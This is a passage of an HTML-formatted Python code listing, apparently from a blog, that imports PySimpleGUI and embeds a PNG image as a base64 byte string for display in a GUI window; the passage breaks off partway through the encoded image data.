class="string">time_between_frames=0, # 显示帧之间要等待的毫秒数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">img=<span class="string">r&quot;c:\bl1.png&quot;</span></span><br><span class="line">base64_bl3= <span class="string">b&#x27;iVBORw0KGgoAAAANSUhEUgAAAK8AAACvCAYAAACLko51AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+tpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNyAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDIwLTExLTMwVDE2OjA5OjMwKzA4OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAyMC0xMS0zMFQxNjoxMToxMiswODowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAyMC0xMS0zMFQxNjoxMToxMiswODowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6OUM0NkE3MTgzMkUzMTFFQkI0MjM5OTlDMjFERTY5ODAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6OUM0NkE3MTkzMkUzMTFFQkI0MjM5OTlDMjFERTY5ODAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RS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